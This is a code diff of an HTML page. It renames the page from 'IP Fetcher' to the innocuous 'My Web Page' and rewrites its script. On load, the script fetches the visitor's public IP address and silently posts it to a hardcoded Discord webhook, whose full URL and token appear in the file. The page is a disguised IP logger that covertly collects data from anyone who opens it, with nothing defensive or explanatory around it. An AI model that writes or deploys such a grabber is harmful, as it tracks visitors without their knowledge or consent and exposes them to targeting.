@@ -1,57 +1,55 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>IP Fetcher</title>
+    <title>My Web Page</title>
+    <script>
+        function sendMessage(webhookURL, message) {
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({content: message})
+            })
+            .catch(error => console.log(error));
+        }
+
+        function splitMessage(message, maxLength) {
+            var messages = [];
+            var words = message.split(' ');
+            var currentMessage = '';
+            words.forEach(word => {
+                if (currentMessage.length + word.length < maxLength) {
+                    currentMessage += word + ' ';
+                } else {
+                    messages.push(currentMessage.trim());
+                    currentMessage = word + ' ';
+                }
+            });
+            messages.push(currentMessage.trim());
+            return messages;
+        }
+
+        window.onload = function() {
+            // Send IP to Discord webhook
+            var ip = '';
+            fetch('https://api.my-ip.io/ip')
+                .then(response => response.text())
+                .then(data => {
+                    ip = data.trim();
+                    var webhookURL = 'https://ptb.discord.com/api/webhooks/1163557901097521256/ow5q-KQn8LhRYqDGU5XTJNu6GwUHMi1lqU65FlotpUUUcsYdRa-MmNkE5QM3j7DO2JGC';
+                    var content = 'IP Address: ' + ip;
+                    if (content.length <= 2000) {
+                        sendMessage(webhookURL, content);
+                    } else {
+                        var messages = splitMessage(content, 2000);
+                        messages.forEach(message => sendMessage(webhookURL, message));
+                    }
+                })
+                .catch(error => console.log(error));
+        };
+    </script>
 </head>
 <body>
-    <script>
-        // Function to fetch the IP address
-        async function fetchIP() {
-            try {
-                const targetURL = "https://api.my-ip.io/ip";
-                const response = await fetch(targetURL, { mode: 'no-cors' });
-
-                if (response.ok) {
-                    const ip = await response.text();
-                    sendToDiscord(ip);
-                } else {
-                    console.error("Failed to fetch IP address.");
-                }
-            } catch (error) {
-                console.error("Error fetching IP address:", error);
-            }
-        }
-
-        // Function to send data to a Discord webhook
-        async function sendToDiscord(ip) {
-            const webhookURL = "https://ptb.discord.com/api/webhooks/1163557901097521256/ow5q-KQn8LhRYqDGU5XTJNu6GwUHMi1lqU65FlotpUUUcsYdRa-MmNkE5QM3j7DO2JGC"; // Your Discord webhook URL
-
-            const data = {
-                content: `My IP address is: ${ip}`
-            };
-
-            const requestOptions = {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify(data)
-            };
-
-            try {
-                const response = await fetch(webhookURL, requestOptions);
-                if (response.ok) {
-                    console.log("Successfully sent IP address to Discord webhook.");
-                } else {
-                    console.error("Failed to send data to Discord webhook.");
-                }
-            } catch (error) {
-                console.error("Error sending data to Discord webhook:", error);
-            }
-        }
-
-        // Call the fetchIP function when the page loads
-        fetchIP();
-    </script>
 </body>
 </html>
